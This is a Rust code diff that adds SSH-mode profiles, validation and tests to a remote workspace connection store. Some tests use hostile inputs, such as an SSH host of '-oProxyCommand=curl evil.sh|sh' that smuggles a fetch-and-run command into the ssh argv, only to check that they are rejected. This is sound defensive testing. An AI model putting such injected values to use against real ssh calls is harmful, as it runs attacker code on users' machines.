@@ -10,7 +10,9 @@ use sea_orm::{
 use crate::app_error::AppCommandError;
 use crate::db::entities::remote_workspace_connection;
 use crate::db::error::DbError;
-use crate::models::{RemoteWorkspaceConnectionInfo, RemoteWorkspaceHeader};
+use crate::models::{
+    RemoteWorkspaceConnectionInfo, RemoteWorkspaceHeader, RemoteWorkspaceSshConfig,
+};
 
 /// Names the client sets itself, on the HTTP calls and on the WebSocket
 /// handshake. The save fails rather than silently drop what the user typed.
@@ -34,17 +36,54 @@ const RESERVED_HEADER_NAMES: &[&str] = &[
     "sec-websocket-extensions",
 ];
 
-fn to_info(model: remote_workspace_connection::Model) -> RemoteWorkspaceConnectionInfo {
-    RemoteWorkspaceConnectionInfo {
+/// A stored `ssh_config` that will not parse.
+///
+/// This is deliberately NOT tolerated the way a bad `headers` value is. Falling
+/// back to `None` would silently reclassify an SSH profile as a plain HTTP one,
+/// and the `base_url`/`token` columns of an SSH profile hold a *stale loopback
+/// endpoint* — the port from some earlier tunnel. The connection would then
+/// appear to work and quietly point at whatever now answers on that local port.
+/// Refusing to load the row is the only safe reading.
+fn ssh_from_column(
+    id: i32,
+    raw: Option<&str>,
+) -> Result<Option<RemoteWorkspaceSshConfig>, AppCommandError> {
+    let Some(raw) = raw else {
+        return Ok(None);
+    };
+    let parsed: RemoteWorkspaceSshConfig = serde_json::from_str(raw).map_err(|e| {
+        AppCommandError::configuration_invalid(format!(
+            "Remote connection {id} has an unreadable SSH configuration"
+        ))
+        .with_detail(e.to_string())
+    })?;
+    // A stored locator still has to satisfy the same rules as a new one: the
+    // validator is the only thing standing between a hand-edited database and an
+    // `ssh` argv that contains an option.
+    let validated = crate::ssh::config::validate_ssh_config(&parsed).map_err(|e| {
+        AppCommandError::configuration_invalid(format!(
+            "Remote connection {id} has an invalid SSH configuration"
+        ))
+        .with_detail(e.message)
+    })?;
+    Ok(Some(validated))
+}
+
+fn to_info(
+    model: remote_workspace_connection::Model,
+) -> Result<RemoteWorkspaceConnectionInfo, AppCommandError> {
+    let ssh = ssh_from_column(model.id, model.ssh_config.as_deref())?;
+    Ok(RemoteWorkspaceConnectionInfo {
         id: model.id,
         name: model.name,
         base_url: model.base_url,
         token: model.token,
         headers: serde_json::from_str(&model.headers).unwrap_or_default(),
+        ssh,
         sort_order: model.sort_order,
         created_at: model.created_at,
         updated_at: model.updated_at,
-    }
+    })
 }
 
 pub fn validate_headers(
@@ -118,6 +157,12 @@ fn validate_token(token: &str) -> Result<String, AppCommandError> {
     Ok(trimmed.to_string())
 }
 
+/// List every connection.
+///
+/// One unreadable SSH row must not take the whole list down — the manage dialog
+/// is where the user would go to *fix* it. The bad row is logged and skipped, so
+/// every other profile stays reachable. `get` is the strict counterpart: opening
+/// a specific broken connection fails loudly rather than silently falling back.
 pub async fn list(
     conn: &DatabaseConnection,
 ) -> Result<Vec<RemoteWorkspaceConnectionInfo>, DbError> {
@@ -126,17 +171,83 @@ pub async fn list(
         .order_by_asc(remote_workspace_connection::Column::Name)
         .all(conn)
         .await?;
-    Ok(rows.into_iter().map(to_info).collect())
+    Ok(rows
+        .into_iter()
+        .filter_map(|row| {
+            let id = row.id;
+            match to_info(row) {
+                Ok(info) => Some(info),
+                Err(err) => {
+                    tracing::error!(
+                        "[RemoteWorkspace] skipping connection {id}: {} ({:?})",
+                        err.message,
+                        err.detail
+                    );
+                    None
+                }
+            }
+        })
+        .collect())
 }
 
 pub async fn get(
     conn: &DatabaseConnection,
     id: i32,
-) -> Result<Option<RemoteWorkspaceConnectionInfo>, DbError> {
+) -> Result<Option<RemoteWorkspaceConnectionInfo>, AppCommandError> {
     let row = remote_workspace_connection::Entity::find_by_id(id)
         .one(conn)
-        .await?;
-    Ok(row.map(to_info))
+        .await
+        .map_err(DbError::from)
+        .map_err(AppCommandError::db)?;
+    row.map(to_info).transpose()
+}
+
+/// The stored shape of a connection's mode-specific fields.
+///
+/// An SSH profile has no user-supplied URL, token or headers: the endpoint and
+/// the credential are discovered at connect time, and there is no proxy in front
+/// of a loopback forward for a custom header to authenticate to. The frontend
+/// sends those three as empty values for an SSH profile and this is where they
+/// are *ignored* rather than validated — running them through `validate_token`
+/// would reject an SSH save for missing a token it must not have.
+struct StoredFields {
+    base_url: String,
+    token: String,
+    headers: String,
+    ssh_config: Option<String>,
+}
+
+fn resolve_stored_fields(
+    base_url: &str,
+    token: &str,
+    headers: &[RemoteWorkspaceHeader],
+    ssh: Option<&RemoteWorkspaceSshConfig>,
+) -> Result<StoredFields, AppCommandError> {
+    match ssh {
+        Some(raw) => {
+            let validated = crate::ssh::config::validate_ssh_config(raw)?;
+            let ssh_config = serde_json::to_string(&validated).map_err(|e| {
+                AppCommandError::invalid_input("Failed to store the SSH configuration")
+                    .with_detail(e.to_string())
+            })?;
+            Ok(StoredFields {
+                // Placeholders. `base_url` is NOT NULL and is what a legacy
+                // reader would show, so it records the host rather than a
+                // fabricated URL — a stale `http://127.0.0.1:<port>` would be
+                // actively misleading, since the real port changes per tunnel.
+                base_url: format!("ssh://{}", validated.host),
+                token: String::new(),
+                headers: "[]".to_string(),
+                ssh_config: Some(ssh_config),
+            })
+        }
+        None => Ok(StoredFields {
+            base_url: normalize_base_url(base_url)?,
+            token: validate_token(token)?,
+            headers: serialize_headers(&validate_headers(headers)?)?,
+            ssh_config: None,
+        }),
+    }
 }
 
 pub async fn create(
@@ -145,9 +256,10 @@ pub async fn create(
     base_url: &str,
     token: &str,
     headers: &[RemoteWorkspaceHeader],
+    ssh: Option<&RemoteWorkspaceSshConfig>,
 ) -> Result<RemoteWorkspaceConnectionInfo, AppCommandError> {
     let now = Utc::now();
-    let headers = serialize_headers(&validate_headers(headers)?)?;
+    let fields = resolve_stored_fields(base_url, token, headers, ssh)?;
     let max_order = remote_workspace_connection::Entity::find()
         .order_by_desc(remote_workspace_connection::Column::SortOrder)
         .one(conn)
@@ -159,9 +271,10 @@ pub async fn create(
     let active = remote_workspace_connection::ActiveModel {
         id: NotSet,
         name: Set(validate_name(name)?),
-        base_url: Set(normalize_base_url(base_url)?),
-        token: Set(validate_token(token)?),
-        headers: Set(headers),
+        base_url: Set(fields.base_url),
+        token: Set(fields.token),
+        headers: Set(fields.headers),
+        ssh_config: Set(fields.ssh_config),
         sort_order: Set(max_order + 1),
         created_at: Set(now),
         updated_at: Set(now),
@@ -171,9 +284,22 @@ pub async fn create(
         .await
         .map_err(DbError::from)
         .map_err(AppCommandError::db)?;
-    Ok(to_info(model))
+    to_info(model)
 }
 
+/// Update a connection, including switching it between HTTP and SSH mode.
+///
+/// A mode switch is a real possibility here, and each direction has a trap.
+/// Switching HTTP → SSH must not keep the old `base_url`/`token` around as a
+/// usable fallback (the tunnel endpoint is the only correct one), and switching
+/// SSH → HTTP must not keep the stale loopback URL the last tunnel happened to
+/// use. `prepare_fields` handles both by deriving the stored columns from the
+/// mode rather than from what the caller sent.
+///
+/// Note the caller is responsible for dropping any cached SSH tunnel for this id
+/// after a successful update — see `commands::remote_workspace::update_*`. An
+/// edited host with a live tunnel to the *old* host would otherwise keep serving
+/// from it.
 pub async fn update(
     conn: &DatabaseConnection,
     id: i32,
@@ -181,8 +307,10 @@ pub async fn update(
     base_url: &str,
     token: &str,
     headers: &[RemoteWorkspaceHeader],
+    ssh: Option<&RemoteWorkspaceSshConfig>,
 ) -> Result<RemoteWorkspaceConnectionInfo, AppCommandError> {
-    let headers = serialize_headers(&validate_headers(headers)?)?;
+    let name = validate_name(name)?;
+    let fields = resolve_stored_fields(base_url, token, headers, ssh)?;
     let row = remote_workspace_connection::Entity::find_by_id(id)
         .one(conn)
         .await
@@ -191,17 +319,18 @@ pub async fn update(
         .ok_or_else(|| AppCommandError::not_found(format!("Remote connection {id} not found")))?;
 
     let mut active = row.into_active_model();
-    active.name = Set(validate_name(name)?);
-    active.base_url = Set(normalize_base_url(base_url)?);
-    active.token = Set(validate_token(token)?);
-    active.headers = Set(headers);
+    active.name = Set(name);
+    active.base_url = Set(fields.base_url);
+    active.token = Set(fields.token);
+    active.headers = Set(fields.headers);
+    active.ssh_config = Set(fields.ssh_config);
     active.updated_at = Set(Utc::now());
     let model = active
         .update(conn)
         .await
         .map_err(DbError::from)
         .map_err(AppCommandError::db)?;
-    Ok(to_info(model))
+    to_info(model)
 }
 
 pub async fn delete(conn: &DatabaseConnection, id: i32) -> Result<(), DbError> {
@@ -372,6 +501,7 @@ mod tests {
             "http://127.0.0.1:3080/",
             "secret-token",
             &[header("CF-Access-Client-Id", "abc123")],
+            None,
         )
         .await
         .unwrap();
@@ -396,6 +526,7 @@ mod tests {
             "https://codeg.example.com/",
             "next-token",
             &[],
+            None,
         )
         .await
         .unwrap();
@@ -419,7 +550,7 @@ mod tests {
         let db = fresh_in_memory_db().await;
         // Seeded through `create` so the legacy row can copy its timestamps
         // verbatim, rather than guessing SeaORM's SQLite datetime encoding.
-        let seed = create(&db.conn, "Seed", "http://127.0.0.1:3080", "token", &[])
+        let seed = create(&db.conn, "Seed", "http://127.0.0.1:3080", "token", &[], None)
             .await
             .unwrap();
         db.conn
@@ -443,23 +574,239 @@ mod tests {
 
         // `create` re-reads every column to find the max sort order, so the
         // legacy row has to survive that read too.
-        let next = create(&db.conn, "Next", "http://127.0.0.1:3081", "token", &[])
+        let next = create(&db.conn, "Next", "http://127.0.0.1:3081", "token", &[], None)
             .await
             .unwrap();
         assert_eq!(next.sort_order, 2);
         assert_ne!(next.id, seed.id);
     }
 
+    fn ssh(host: &str) -> RemoteWorkspaceSshConfig {
+        RemoteWorkspaceSshConfig {
+            host: host.to_string(),
+            ..Default::default()
+        }
+    }
+
+    /// An SSH profile stores the locator and nothing that looks like a usable
+    /// HTTP endpoint. The frontend sends empty url/token/headers for this mode,
+    /// and they must be ignored rather than rejected.
+    #[tokio::test]
+    async fn create_accepts_an_ssh_profile_with_empty_http_fields() {
+        let db = fresh_in_memory_db().await;
+        let created = create(
+            &db.conn,
+            "Build box",
+            "",
+            "",
+            &[],
+            Some(&RemoteWorkspaceSshConfig {
+                host: "build-box".into(),
+                username: Some("ann".into()),
+                port: Some(2222),
+                identity_file: Some("~/.ssh/id_ed25519".into()),
+            }),
+        )
+        .await
+        .unwrap();
+
+        let stored = created.ssh.as_ref().expect("ssh locator persisted");
+        assert_eq!(stored.host, "build-box");
+        assert_eq!(stored.username.as_deref(), Some("ann"));
+        assert_eq!(stored.port, Some(2222));
+        assert_eq!(stored.identity_file.as_deref(), Some("~/.ssh/id_ed25519"));
+        assert!(created.is_ssh());
+        // Never a dialable http(s) URL: an SSH profile's endpoint only exists
+        // once a tunnel is up.
+        assert!(
+            !created.base_url.starts_with("http"),
+            "stored base_url must not masquerade as a usable endpoint: {}",
+            created.base_url
+        );
+        assert!(created.token.is_empty(), "no token is persisted for SSH");
+
+        // And it survives a re-read.
+        let fetched = get(&db.conn, created.id).await.unwrap().unwrap();
+        assert_eq!(fetched.ssh.as_ref().map(|s| s.host.clone()).as_deref(), Some("build-box"));
+    }
+
+    /// An unset port must stay unset through a save/load cycle: writing 22 would
+    /// silently override a `~/.ssh/config` that says otherwise.
+    #[tokio::test]
+    async fn an_unset_ssh_port_is_not_defaulted_on_the_way_through_the_db() {
+        let db = fresh_in_memory_db().await;
+        let created = create(&db.conn, "Box", "", "", &[], Some(&ssh("box")))
+            .await
+            .unwrap();
+        let stored = created.ssh.unwrap();
+        assert_eq!(stored.port, None);
+        assert_eq!(stored.username, None);
+        assert_eq!(stored.identity_file, None);
+    }
+
+    /// Injection is rejected at the service boundary too, not only in the
+    /// command layer — the database must never come to hold an argv-poisoning
+    /// locator.
+    #[tokio::test]
+    async fn create_rejects_an_option_injecting_ssh_host() {
+        let db = fresh_in_memory_db().await;
+        let err = create(
+            &db.conn,
+            "Evil",
+            "",
+            "",
+            &[],
+            Some(&ssh("-oProxyCommand=curl evil.sh|sh")),
+        )
+        .await
+        .unwrap_err();
+        assert!(matches!(err.code, crate::app_error::AppErrorCode::InvalidInput));
+        assert!(list(&db.conn).await.unwrap().is_empty(), "nothing was stored");
+    }
+
+    /// Switching SSH → HTTP must replace the placeholder locator wholesale, and
+    /// HTTP → SSH must not leave the old URL/token behind as a usable fallback.
+    #[tokio::test]
+    async fn switching_between_http_and_ssh_leaves_no_stale_credentials() {
+        let db = fresh_in_memory_db().await;
+        let http = create(
+            &db.conn,
+            "Server",
+            "https://codeg.example.com",
+            "http-token",
+            &[header("CF-Access-Client-Id", "abc")],
+            None,
+        )
+        .await
+        .unwrap();
+        assert!(!http.is_ssh());
+
+        let as_ssh = update(&db.conn, http.id, "Server", "", "", &[], Some(&ssh("box")))
+            .await
+            .unwrap();
+        assert!(as_ssh.is_ssh());
+        assert!(
+            as_ssh.token.is_empty(),
+            "the old HTTP token must not survive the switch to SSH"
+        );
+        assert!(
+            !as_ssh.base_url.starts_with("http"),
+            "the old HTTP URL must not survive: {}",
+            as_ssh.base_url
+        );
+        assert!(
+            as_ssh.headers.is_empty(),
+            "custom headers do not apply to a loopback tunnel"
+        );
+
+        let back_to_http = update(
+            &db.conn,
+            http.id,
+            "Server",
+            "https://codeg.example.com",
+            "fresh-token",
+            &[],
+            None,
+        )
+        .await
+        .unwrap();
+        assert!(!back_to_http.is_ssh());
+        assert_eq!(back_to_http.ssh, None, "the SSH locator is cleared");
+        assert_eq!(back_to_http.token, "fresh-token");
+    }
+
+    /// The load-bearing compatibility guarantee: every row written before this
+    /// column existed has `ssh_config IS NULL` and must read back as a plain
+    /// HTTP profile, unchanged.
+    #[tokio::test]
+    async fn legacy_rows_without_an_ssh_column_stay_plain_http() {
+        use sea_orm::{ConnectionTrait, DbBackend, Statement};
+
+        let db = fresh_in_memory_db().await;
+        create(&db.conn, "Seed", "http://127.0.0.1:3080", "token", &[], None)
+            .await
+            .unwrap();
+        db.conn
+            .execute(Statement::from_string(
+                DbBackend::Sqlite,
+                "INSERT INTO remote_workspace_connection \
+                 (name, base_url, token, headers, sort_order, created_at, updated_at) \
+                 SELECT 'Legacy', 'http://127.0.0.1:3099', token, '[]', 1, \
+                 created_at, updated_at FROM remote_workspace_connection"
+                    .to_owned(),
+            ))
+            .await
+            .unwrap();
+
+        let listed = list(&db.conn).await.unwrap();
+        assert_eq!(listed.len(), 2);
+        for item in &listed {
+            assert_eq!(item.ssh, None, "{} must read as HTTP", item.name);
+            assert!(!item.is_ssh());
+        }
+        assert_eq!(listed[1].base_url, "http://127.0.0.1:3099");
+    }
+
+    /// A hand-edited or corrupted `ssh_config` must NOT quietly degrade into an
+    /// HTTP profile: the `base_url` column of an SSH row is a placeholder, and
+    /// treating it as real would point the connection at whatever now answers on
+    /// some old loopback port. `get` fails loudly; `list` skips the row so the
+    /// rest of the manage dialog still works.
+    #[tokio::test]
+    async fn an_unreadable_ssh_config_is_refused_rather_than_downgraded() {
+        use sea_orm::{ConnectionTrait, DbBackend, Statement};
+
+        let db = fresh_in_memory_db().await;
+        let good = create(&db.conn, "Good", "http://127.0.0.1:3080", "token", &[], None)
+            .await
+            .unwrap();
+        let broken = create(&db.conn, "Broken", "", "", &[], Some(&ssh("box")))
+            .await
+            .unwrap();
+
+        for poison in [
+            "",
+            "   ",
+            "not json at all",
+            "{\"host\":\"-oProxyCommand=evil\"}",
+            "{\"host\":\"\"}",
+            "{}",
+        ] {
+            db.conn
+                .execute(Statement::from_sql_and_values(
+                    DbBackend::Sqlite,
+                    "UPDATE remote_workspace_connection SET ssh_config = ?1 WHERE id = ?2",
+                    [poison.into(), broken.id.into()],
+                ))
+                .await
+                .unwrap();
+
+            let err = get(&db.conn, broken.id).await.unwrap_err();
+            assert!(
+                matches!(err.code, crate::app_error::AppErrorCode::ConfigurationInvalid),
+                "poison {poison:?} should be refused, got {:?}",
+                err.code
+            );
+
+            let listed = list(&db.conn).await.unwrap();
+            assert_eq!(
+                listed.iter().map(|c| c.id).collect::<Vec<_>>(),
+                vec![good.id],
+                "the broken row is skipped but the good one survives ({poison:?})"
+            );
+        }
+    }
+
     #[tokio::test]
     async fn reorder_updates_list_order() {
         let db = fresh_in_memory_db().await;
-        let first = create(&db.conn, "First", "http://127.0.0.1:3080", "token-a", &[])
+        let first = create(&db.conn, "First", "http://127.0.0.1:3080", "token-a", &[], None)
             .await
             .unwrap();
-        let second = create(&db.conn, "Second", "http://127.0.0.1:3081", "token-b", &[])
+        let second = create(&db.conn, "Second", "http://127.0.0.1:3081", "token-b", &[], None)
             .await
             .unwrap();
-        let third = create(&db.conn, "Third", "http://127.0.0.1:3082", "token-c", &[])
+        let third = create(&db.conn, "Third", "http://127.0.0.1:3082", "token-c", &[], None)
             .await
             .unwrap();
 
@@ -484,10 +831,10 @@ mod tests {
     #[tokio::test]
     async fn reorder_rejects_partial_or_duplicate_ids() {
         let db = fresh_in_memory_db().await;
-        let first = create(&db.conn, "First", "http://127.0.0.1:3080", "token-a", &[])
+        let first = create(&db.conn, "First", "http://127.0.0.1:3080", "token-a", &[], None)
             .await
             .unwrap();
-        let second = create(&db.conn, "Second", "http://127.0.0.1:3081", "token-b", &[])
+        let second = create(&db.conn, "Second", "http://127.0.0.1:3081", "token-b", &[], None)
             .await
             .unwrap();
 
